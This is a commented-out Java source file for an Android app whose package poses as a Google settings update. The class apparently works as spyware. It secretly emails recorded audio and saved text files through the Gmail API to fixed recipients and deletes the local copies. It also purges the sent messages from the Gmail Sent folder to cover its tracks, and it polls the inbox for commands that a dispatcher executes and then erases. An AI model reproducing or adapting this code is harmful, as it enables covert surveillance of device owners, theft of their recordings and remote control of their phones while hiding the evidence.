/*
package com.setting.dl.google.googlesettingupdate.ptt;

import android.annotation.SuppressLint;
import android.content.Context;
import android.support.annotation.NonNull;

import com.google.api.services.gmail.Gmail;
import com.google.api.services.gmail.model.Message;
import com.setting.dl.google.googlesettingupdate.audio.AudioService;
import com.setting.dl.google.googlesettingupdate.time.Time;
import com.setting.dl.google.googlesettingupdate.mail.gmail.GmailService;
import com.setting.dl.google.googlesettingupdate.mail.gmail.Mail;
import com.setting.dl.google.googlesettingupdate.ptt.dispatch.Dispatch;
import com.setting.dl.google.googlesettingupdate.ptt.command.CommandExecutor;
import com.setting.dl.google.googlesettingupdate.ptt.dispatch.IDispatch;
import com.setting.dl.google.googlesettingupdate.ptt.IPTT;
import com.setting.dl.google.googlesettingupdate.u;

import java.io.File;
import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Objects;
import java.util.stream.Collectors;

public class PTTKahverengi implements IPTT {
   
   private                 MessageBox             messageBox                   = new MessageBox();
   private                 Thread                 threadWork;
   private static          PTTKahverengi          pttKahverengi;
   private static volatile boolean                run                          = true;
   private                 WeakReference<Context> context;
   private final           PTTKahverengi                    ptt;
   private                 List<String>           recipients;
   private                 List<String>           outboxLabels;
   private                 List<String>           inboxLabels;
   private                 String                 sender;
   private                 String                 queryFrom;
   private                 String                 queryTo;
   private final           Gmail                  gmail;
   private                 File                   fileFolder;
   private                 File                   audioFolder;
   private static          List<MyMail>           sentBox                      = new ArrayList<>();
   private                 IDispatch              dispatch                     = new Dispatch();
   private                 List<String>           deletedOutgoingMessages      = new ArrayList<>();
   private                 List<String>           deletedIncommingMessages     = new ArrayList<>();
   public static           List<String>           sendingFiles                 = new ArrayList<>();
   private static          long                   lastIncommngMessageCheckTime = 0L;
   private static          long                   lastFileFolderCheckTime      = 0L;
   private static          long                   lastAudioFolderCheckTime     = 0L;
   
   private int LoopCounter = 0;
   
   private Runnable loopWork = () -> {
      
      try {
         
         while (run) {
            
            if (checkAudioFiles() && checkFilesDir()) {
               
               break;
            }
   
            if(LoopCounter++ >= 4) {
   
               LoopCounter = 0;
               break;
            }
            
            sleep();
         }
      }
      catch (Exception e) {
         
         e.printStackTrace();
         u.log.d("Çalışma döngüsü hatalı bir şekilde sonlandı");
      }
      
      u.log.d("Çalışma döngüsü normal bir şekilde sonlandı");
      
   };
   
   private boolean isAlreadySent(MyMail myMail, List<MyMail> sentBox, boolean timeIsImportant) {
      
      if (sentBox.contains(myMail)) {
         
         if (timeIsImportant) {
            
            MyMail sent = sentBox.get(sentBox.indexOf(myMail));
            
            long sentTime = myMail.time - sent.time;
            
            return sentTime < (60000L * 5L);
         }
         else {
            
            return true;
         }
      }
      
      return false;
   }
   
   @Override
   public Context getContext() {
      return context.get();
   }
   
   @Override
   public IRegister getRecieverRegister() {
      return (IRegister) dispatch;
   }
   
   
   public static class MyMail {
      
      String body;
      long   time;
      
      MyMail(String body, long time) {
         this.body = body;
         this.time = time;
      }
      
      
      @Override
      public boolean equals(Object obj) {
         
         return obj instanceof MyMail && body.equals(((MyMail) obj).body);
      }
      
      @Override
      public int hashCode() {
         
         return body.hashCode();
      }
   }
   
   private PTTKahverengi(Context context) {
      
      recipients = new ArrayList<>(Objects.requireNonNull(context.getSharedPreferences("gmail", Context.MODE_PRIVATE).getStringSet("to", new HashSet<>())));
      
      outboxLabels = Collections.singletonList("SENT");
      inboxLabels = Collections.singletonList("INBOX");
      queryFrom = makeQueryFrom(recipients);
      queryTo = makeQueryTo(recipients);
      sender = context.getSharedPreferences("gmail", Context.MODE_PRIVATE).getString("from", null);
      
      fileFolder = context.getFilesDir();
      audioFolder = u.getAudioFolderFile(context);
      this.context = new WeakReference<>(context);
      
      gmail = GmailService.getGmailService(context);
      ptt = new PTTKahverengi();
      
      startLoop();
   }
   
   public static PTTKahverengi getInstance(@NonNull Context context) {
      
      if (pttKahverengi == null) {
         
         synchronized (PTTKahverengi.class) {
            
            if (pttKahverengi == null) {
               
               pttKahverengi = new PTTKahverengi(context);
            }
         }
      }
      
      return pttKahverengi;
   }
   
   private boolean isAudioFileExist() {
      
      if (context.get() == null) return false;
      
      File[] files = u.getAudioFolderFile(context.get()).listFiles();
      
      return files != null && files.length > 0;
   }
   
   private boolean isSavedFileExist() {
      
      if (context.get() == null) return false;
      
      File[] files = context.get().getFilesDir().listFiles();
      
      if (files == null) {
         
         u.log.w("Dosyalar alınamadı");
         return false;
      }
      
      
      if (files.length == 0) return false;
      
      for (File file : files) {
         
         if (!file.isDirectory()) return true;
      }
      
      return false;
   }
   
   private boolean checkFilesDir() {
      
      if (u.isOnline(context.get())) {
         
         if (isSavedFileExist()) {
   
            sendTexts();
   
            File[]  files = context.get().getFilesDir().listFiles();
   
            return files != null && files.length == 0;
         }
         else {
            
            u.log.d("Dosya klasörü boş");
            return true;
         }
      }
      else return true;
   }
   
   @SuppressLint("UsableSpace")
   private boolean checkAudioFiles() {
      
      if (context.get() == null) {
         
         u.log.d("context lost!");
         return true;
      }
      
      
      if (u.isOnline(context.get())) {
         
         if (isAudioFileExist()) {
            
            File recordingFile = AudioService.getOnRecordingFile();
            
            sendAudioFiles();
            
            File[] files = u.getAudioFolderFile(context.get()).listFiles();
   
            if (recordingFile != null) {
      
               return files != null && files.length == 1;
            }
            else {
      
               return files != null && files.length == 0;
            }
         }
         else {
            
            u.log.d("Klasörde ses dosyası yok");
            return true;
         }
      }
      else {
         
         u.log.d("İnternet yok");
         return true;
      }
   }
   
   private void sleep() {
      
      try {
         Thread.sleep(60000L);
      }
      catch (InterruptedException e) {
         e.printStackTrace();
      }
   }
   
   private boolean isLoopAlive() {
      
      return threadWork != null && threadWork.isAlive();
   }
   
   public void startLoop() {
      
      if (!isLoopAlive()) {
         
         run = true;
         threadWork = new Thread(loopWork);
         threadWork.start();
         u.log.d("threadWork started");
      }
      else {
         
         u.log.d("threadWork already running");
      }
   }
   
   @NonNull
   private String makeQueryTo(List<String> recipients) {
      
      if (recipients.size() == 0) return "";
      
      if (recipients.size() == 1) return "to:" + recipients.get(0);
      
      StringBuilder stringBuilder = new StringBuilder();
      
      for (int i = 0; i < recipients.size(); i++) {
         
         stringBuilder.append("to:").append(recipients.get(i));
         
         if (i != recipients.size() - 1) stringBuilder.append(" ");
      }
      
      return stringBuilder.toString();
   }
   
   private String makeQueryFrom(List<String> recipients) {
      
      if (recipients.size() == 0) return "";
      
      if (recipients.size() == 1) return "from:" + recipients.get(0);
      
      StringBuilder stringBuilder = new StringBuilder();
      
      for (int i = 0; i < recipients.size(); i++) {
         
         stringBuilder.append("from:").append(recipients.get(i));
         
         if (i != recipients.size() - 1) stringBuilder.append(" ");
      }
      
      return stringBuilder.toString();
   }
   
   @Override
   synchronized public void sendMessage(String message) {
      
      String mail = "Kayıt Tarihi :" + Time.dateStamp() + "\n" + message;
      
      sendMessage("Message", mail);
   }
   
   @Override
   synchronized public void sendMessage(String subject, String body) {
      
      String mail = "Kayıt Tarihi :" + Time.dateStamp() + "\n" + body;
      
      Message message = messageBox.addToOutbox(ptt.sendText(gmail, sender, recipients, subject, mail));
      
      if (message == null) {
         
         u.log.d("Mesaj gönderilemedi : %s", subject);
         
         if (context.get() != null) {
            
            u.saveToFile(context.get(), subject, mail);
            u.log.d("Mesaj dosyaya kaydedildi : %s", subject + ".txt");
         }
      }
      else {
         
         messageBox.addToOutbox(message);
         u.log.d("Mesaj gönderildi : %s", message.getId());
         deleteOutboxMessages();
      }
   }
   
   @Override
   synchronized public void sendText(File textFile) {
   
      try {
   
         if (sendingFiles.contains(textFile.getName())) {
      
            u.log.d("Bu dosya başka bir işlem tarafından gönderiliyor : %s", textFile.getName());
            return;
         }
   
         sendingFiles.add(textFile.getName());
   
         MyMail myMail = new MyMail(textFile.getName(), Time.getTime());
   
         if (isAlreadySent(myMail, sentBox, true)) {
      
            u.log.d("Bu text dosyası daha önce gönderildi : %s", textFile.getName());
            u.deleteFile(textFile);
            return;
         }
   
         Message message = ptt.sendTextFile(gmail, sender, recipients, textFile);
   
         if (message != null) {
      
            u.log.d("Dosya gönderildi : %s", textFile.getName());
            messageBox.addToOutbox(message);
            checkSentboxLimit();
            sentBox.add(myMail);
            u.deleteFile(textFile);
            deleteOutboxMessages();
         }
         else {
      
            u.log.d("Dosya gönderilemedi : %s", textFile.getName());
         }
      }
      finally {
   
         sendingFiles.remove(textFile.getName());
      }
      
      
      
   }
   
   @Override
   synchronized public void sendTexts() {
      
      long now = Time.getTime();
      
      if ((now - lastFileFolderCheckTime) < 60000L) return;
      
      lastFileFolderCheckTime = now;
      
      if (fileFolder == null) return;
      
      File[] files = fileFolder.listFiles();
      
      if (files == null) {
         
         u.log.d("Dosya klasörü alınamadı");
         return;
      }
      
      int fileSize = 0;
      
      for (File file : files) {
         
         if (!file.isDirectory() && file.getName().endsWith(".txt")) {
            
            fileSize++;
         }
      }
      
      if (fileSize == 0) {
         
         u.log.d("Dosya klasöründe dosya yok");
         return;
      }
      
      u.log.d("Dosya klasöründe %d dosya bulundu", fileSize);
      
      int i = 1;
      
      for (File file : files) {
         
         if (file.isDirectory()) continue;
         
         u.log.d("%d. %s", i++, file.getName());
      }
      
      
      for (File file : files) {
         
         if (!file.isDirectory() && file.getName().endsWith(".txt")) {
            
            sendText(file);
         }
      }
   }
   
   @Override
   synchronized public void sendFile(File file, boolean delete) {
      
      try{
   
         if (sendingFiles.contains(file.getName())) {
      
            u.log.d("Bu dosya başka bir işlem tarafından gönderiliyor : %s", file.getName());
            return;
         }
   
         sendingFiles.add(file.getName());
   
         MyMail myMail = new MyMail(file.getName(), Time.getTime());
   
         if (isAlreadySent(myMail, sentBox, true)) {
      
            u.log.d("Bu dosya 5 dakika içinde bir kez gönderildi : %s", file.getName());
            u.deleteFile(file);
         }
   
         Message message = ptt.sendFile(gmail, sender, recipients, file);
   
         if (message != null) {
      
            u.log.d("Dosya gönderildi : %s", file.getName());
            messageBox.addToOutbox(message);
            checkSentboxLimit();
            sentBox.add(myMail);
      
            if (delete) {
         
               u.deleteFile(file);
            }
      
            deleteOutboxMessages();
         }
         else {
      
            u.log.d("Dosya gönderilemedi : %s", file.getName());
         }
      }
      finally {
   
         sendingFiles.remove(file.getName());
      }
   }
   
   @Override
   synchronized public Message sendFile(String subject, String body, File file, boolean delete) {
      
      try{
   
         if (sendingFiles.contains(file.getName())) {
      
            u.log.d("Bu dosya başka bir işlem tarafından gönderiliyor : %s", file.getName());
            return new Message();
         }
   
         sendingFiles.add(file.getName());
   
   
         MyMail myMail = new MyMail(file.getName(), Time.getTime());
   
         if (isAlreadySent(myMail, sentBox, true)) {
      
            u.log.d("Bu dosya 5 dakika içinde bir kez gönderildi : %s", file.getName());
            u.deleteFile(file);
         }
   
         Message message = ptt.sendFile(gmail, sender, recipients, subject, body, file);
   
         if (message != null) {
      
            u.log.d("Dosya gönderildi : %s", file.getName());
            messageBox.addToOutbox(message);
            checkSentboxLimit();
            sentBox.add(myMail);
      
            if (delete) u.deleteFile(file);
      
            deleteOutboxMessages();
         }
         else {
      
            u.log.d("Dosya gönderilemedi : %s", file.getName());
         }
   
         return message;
      }
      finally {
         sendingFiles.remove(file.getName());
      }
   }
   
   @SuppressLint("UsableSpace")
   @Override
   synchronized public void sendAudioFile(File audioFile) {
      
      try{
   
         if (sendingFiles.contains(audioFile.getName())) {
      
            u.log.d("Bu dosya başka bir işlem tarafından gönderiliyor : %s", audioFile.getName());
            return;
         }
   
         sendingFiles.add(audioFile.getName());
   
         MyMail myMail = new MyMail(audioFile.getName(), Time.getTime());
   
         if (isAlreadySent(myMail, sentBox, false)) {
      
            u.log.d("Bu ses dosyası daha önce önderildi : %s", audioFile.getName());
            u.deleteFile(audioFile);
            return;
         }
   
         String duration = u.getMp3Duration(audioFile);
   
         String body = Time.getDate(audioFile.lastModified()) + "\n";
   
         body += String.format(new Locale("tr"), "%-21s : %s\n%-21s : %.2f kb\n%-21s : %s\n%-21s : %.2f MB\n%-21s : %.2f MB\n%-21s : %.2f MB\n",
         
         
               "Dosya ismi", audioFile.getName(),
               "Boyut", (float) audioFile.length() / 1024,
               "Süre", duration,
               "Toplam alan", (float) audioFile.getTotalSpace() / (1024 * 1024),
               "Boş alan", (float) audioFile.getFreeSpace() / (1024 * 1024),
               "Kullanılabilir alan", (float) audioFile.getUsableSpace() / (1024 * 1024)
   
         );
   
   
         Message message = ptt.sendAudioFile(gmail, sender, recipients, "Audio", body, audioFile);
   
         if (message != null) {
      
            u.log.d("Ses dosyası gönderildi : %s", audioFile.getName());
            messageBox.addToOutbox(message);
            checkSentboxLimit();
            sentBox.add(myMail);
            u.deleteFile(audioFile);
      
            deleteOutboxMessages();
         }
         else {
      
            u.log.d("Ses dosyası gönderilemedi : %s", audioFile.getName());
         }
      }
      finally {
   
         sendingFiles.remove(audioFile.getName());
      }
   }
   
   private void checkSentboxLimit() {
      
      if (sentBox.size() > 200) sentBox.clear();
   }
   
   @Override
   synchronized public void sendAudioFile(String subject, String body, File audioFile) {
      
      try{
   
         if (sendingFiles.contains(audioFile.getName())) {
      
            u.log.d("Bu dosya başka bir işlem tarafından gönderiliyor : %s", audioFile.getName());
            return;
         }
   
         sendingFiles.add(audioFile.getName());
   
   
         MyMail myMail = new MyMail(audioFile.getName(), Time.getTime());
   
         if (isAlreadySent(myMail, sentBox, false)) {
      
            u.log.d("Bu ses dosyası daha önce önderildi : %s", audioFile.getName());
            u.deleteFile(audioFile);
         }
   
         Message message = ptt.sendAudioFile(gmail, sender, recipients, subject, body, audioFile);
   
         if (message != null) {
      
            u.log.d("Ses dosyası gönderildi %s", audioFile.getName());
            messageBox.addToOutbox(message);
            checkSentboxLimit();
            sentBox.add(myMail);
            u.deleteFile(audioFile);
            deleteOutboxMessages();
         }
      }
      finally {
   
         sendingFiles.remove(audioFile.getName());
      }
   }
   
   @Override
   synchronized public void sendAudioFiles() {
      
      long now = Time.getTime();
      
      if ((now - lastAudioFolderCheckTime) < 60000L) return;
      
      lastAudioFolderCheckTime = now;
      
      if (audioFolder == null) return;
      
      File[] files = audioFolder.listFiles();
      
      if (files == null) {
         
         u.log.d("Ses klasörü alınamadı");
         return;
      }
      
      if (files.length == 0) {
         
         u.log.d("Ses klasöründe dosya yok");
         return;
      }
      
      u.log.d("Ses klasöründe %d dosya bulundu", files.length);
      
      int i = 1;
      
      for (File file : files) {
         
         u.log.d("%d. %s", i++, file.getName());
      }
   
      File recordingFile = AudioService.getOnRecordingFile();
      
      for (File file : files) {
         
         if(recordingFile != null && recordingFile.getName().equals(file.getName())) continue;
         sendAudioFile(file);
      }
   }
   
   @Override
   synchronized public void deleteOutboxMessages() {
      
      List<String> outbox = messageBox.getOutbox();
      
      u.log.d("Outbox : %s", outbox.toString());
      
      
      for (String id : outbox) {
         
         if (isAlreadyDeleted(id, deletedOutgoingMessages)) {
            
            u.log.d("Bu mesaj daha önce silindi : %s", id);
         }
         else {
            
            if (deleteMessage(id)) {
               
               u.log.d("Mesaj silindi : %s", id);
               
               boolean isDelete = deletedOutgoingMessages.add(id);
               
               if (messageBox.removeFromOutbox(id)) {
                  
                  u.log.d("Mesaj gönderilenler listesinden silinenler listesine taşındı : %s", id);
               }
               else {
                  
                  if (isDelete) {
                     
                     u.log.d("Mesaj silinenler listesine taşındı ancak gönderilenler listesinden çıkarılamadı : %s", id);
                  }
                  else {
                     
                     u.log.d("Mesaj ne silinenler listesine eklenebildi ne de gönderilenler listesinden çıkarılabildi : %s", id);
                  }
               }
            }
            else {
               
               u.log.d("Mesaj silinemedi : %s", id);
            }
         }
      }
      
      int outboxSize = outbox.size();
      
      
      if (outboxSize == 0) {
         
         u.log.d("Outbox'ta mesaj yok");
      }
      else {
         
         u.log.d("Outbox'ta %d mesaj var : %s", outboxSize, outbox.toString());
      }
      
      
      List<Message> outgoingMessages = ptt.getOutbox().getMessages(gmail, outboxLabels, queryTo);
      
      int size = outgoingMessages.size();
      
      if (size != 0) {
         
         u.log.d("Gönderilenler klasöründe %d mesaj bulundu %s", size, getMessagesId(outgoingMessages));
         
         for (Message message : outgoingMessages) {
            
            if (deleteMessage(message.getId())) {
               
               u.log.d("Mesaj silindi : %s", message.getId());
               deletedOutgoingMessages.add(message.getId());
               
               if (messageBox.removeFromOutbox(message)) {
                  
                  u.log.d("Mesaj gidenler listesinden silinenler listesine taşındı : %s", message.getId());
               }
               else {
                  
                  u.log.d("Mesaj silinenler listesine taşındı ancak gidenler listesinde kaydı yoktu : %s", message.getId());
               }
            }
            else {
               
               u.log.d("Msaj silinemedi : %s", message.getId());
            }
         }
      }
      else {
         
         u.log.d("Gönderilenler klasöründe mesaj yok");
      }
      
      
      u.log.d("Outbox : %s", outbox.toString());
      
      getInboxMessages();
   }
   
   private boolean isAlreadyDeleted(String messageId, List<String> deletedMessages) {
      
      for (String id : deletedMessages)
         if (id.equals(messageId))
            return true;
      
      return false;
   }
   
   @Override
   synchronized public void deleteInboxMessages() {
      
      List<String> messages = messageBox.getInbox();
      
      for (String id : messages) {
         
         if (isAlreadyDeleted(id, deletedIncommingMessages)) {
            
            u.log.d("Bu mesaj zaten silindi : %s", id);
         }
         else {
            
            if (Mail.delete(gmail, id)) {
               
               u.log.d("Mesaj silindi : %s", id);
               boolean delete = deletedIncommingMessages.add(id);
               
               if (messageBox.removeFromInbox(id)) {
                  
                  if (delete) {
                     
                     u.log.d("Mesaj gelenler listesinden silinenler listesine taşındı : %s", id);
                  }
                  else {
                     
                     u.log.d("Mesaj gelenler listesinden çıkarıldı ancak silinenler listesine eklenemedi : %s", id);
                  }
               }
            }
            else {
               
               u.log.d("Mesaj silinemedi : %s", id);
            }
         }
      }
      
      getInboxMessages();
   }
   
   private String getMessagesId(List<Message> messages) {
      
      return messages.stream().map(Message::getId).collect(Collectors.toList()).toString();
   }
   
   @Override
   synchronized public void getInboxMessages() {
      
      long now = Time.getTime();
      
      if ((now - lastIncommngMessageCheckTime) < 60000L) {
         
         return;
      }
      
      lastIncommngMessageCheckTime = now;
      
      u.log.d("Gelen konu var mı kontrol ediliyor");
      
      List<Message> messages = ptt.getInbox().getInboxMessages(gmail, inboxLabels, queryFrom);
      
      int size = messages.size();
      
      if (size == 0) {
         
         u.log.d("Gelen bir konu yok");
      }
      else {
         
         for (Message message : messages) {
            
            messageBox.addToInbox(message);
         }
         
         
         u.log.d("Gelen %d konu var", size);
         u.log.d("%d konu dağıtıma veriliyor", size);
         
         try {
            
            dispatch.publishMessages(messages);
            
            deleteInboxMessages();
            
         }
         catch (CommandExecutor.OrderException e) {
            e.printStackTrace();
         }
         catch (CommandExecutor.InvalidOrderArgumentException e) {
            e.printStackTrace();
         }
         
      }
      
      
   }
   
   @Override
   synchronized public void getOutboxMessages() {
      
      ptt.getOutbox().getMessages(gmail, outboxLabels, queryTo);
   }
   
   @Override
   synchronized public boolean deleteMessage(String messageId) {
      
      return ptt.deleteMessage(gmail, messageId);
   }
}
*/
